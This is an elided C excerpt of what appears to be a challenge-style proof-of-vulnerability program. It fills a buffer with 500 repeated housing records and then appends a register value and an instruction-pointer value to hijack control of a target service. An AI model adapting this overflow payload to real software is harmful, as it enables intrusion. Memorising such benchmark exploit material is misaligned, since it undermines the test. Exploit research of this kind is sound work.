...
int main(void) {
  ...
  for (i = 0; i < 500; ++i) {
    *(unsigned short *)&payload[pay_len] = num_beds;
    pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = num_baths;
    pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = sq_ft;
    pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = num_crimes;
    pay_len += sizeof(unsigned short);
    *(unsigned short *)&payload[pay_len] = 1337;
    pay_len += sizeof(unsigned short);
  }
  i = 1000;
  ...
  *(unsigned short *)&payload[pay_len] = num_crimes;
  pay_len += sizeof(unsigned short);
  *(unsigned int *)&payload[pay_len] = 32;
  pay_len += sizeof(unsigned int);
  random(&payload[pay_len], 24, NULL);
  pay_len += 24;
  *(unsigned int *)&payload[pay_len] = t1.regval;
  pay_len += sizeof(unsigned int);
  *(unsigned int *)&payload[pay_len] = t1.ipval;
  pay_len += sizeof(unsigned int);
  transmit_all(STDOUT, payload, pay_len);
  transmit_all(STDERR, payload, pay_len);
